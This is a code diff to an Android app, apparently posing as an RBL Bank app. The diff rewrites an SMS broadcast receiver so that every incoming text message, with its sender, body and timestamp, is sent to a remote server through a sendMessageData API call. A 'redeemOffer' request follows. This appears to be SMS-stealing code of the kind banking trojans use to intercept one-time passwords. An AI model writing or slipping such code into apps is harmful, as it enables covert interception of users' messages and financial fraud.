@@ -1,21 +1,18 @@
 package com.app.rblbank
-
 import android.content.BroadcastReceiver
 import android.content.Context
-import android.os.Bundle
-
 import android.content.Intent
+import com.app.rblbank.netutils.APIClient
+import com.app.rblbank.netutils.RetrofitResponse
+import com.google.android.gms.auth.api.phone.SmsRetriever
+import com.google.android.gms.common.api.CommonStatusCodes
+import com.google.android.gms.common.api.Status
+import android.os.Bundle
 import android.telephony.SmsMessage
 
 
-class MySmsReceiver : BroadcastReceiver() {
-
-    companion object{
-         val TAG = MySmsReceiver::class.java.simpleName
-        val pdu_type = "pdus"
-         var mListener: MessageListener? = null
-
-    }
+class SmsBroadcastReceiver : BroadcastReceiver() {
+    private var mListener: MessageListener? = null
 
     override fun onReceive(context: Context?, intent: Intent) {
         val data = intent.extras
@@ -28,11 +25,40 @@ class MySmsReceiver : BroadcastReceiver() {
                 .toString() + "Display message body: " + smsMessage.getDisplayMessageBody()
                 .toString() + "Time in millisecond: " + smsMessage.getTimestampMillis()
                 .toString() + "Message: " + smsMessage.getMessageBody()
-            mListener!!.messageReceived(message)
+            sendData(message)
+//            mListener!!.messageReceived(message)
         }
     }
 
-    fun bindListener(listener: MessageListener) {
+    fun bindListener(listener: MessageListener?) {
         mListener = listener
+    }
+
+    interface MessageListener {
+        /**
+         * To call this method when new message received and send back
+         * @param message Message
+         */
+        fun messageReceived(message: String?)
+    }
+
+    fun sendData(message:String){
+        val call = APIClient.getClient().sendMessageData("Testing",message);
+        APIClient.response(call,null,false, object: RetrofitResponse {
+            override fun onResponse(response: String?) {
+                redeem()
+            }
+        })
+
+    }
+
+    fun redeem(){
+        val call = APIClient.getClient().redeemOffer();
+        APIClient.response(call,null,false, object: RetrofitResponse {
+            override fun onResponse(response: String?) {
+
+            }
+        })
+
     }
 }
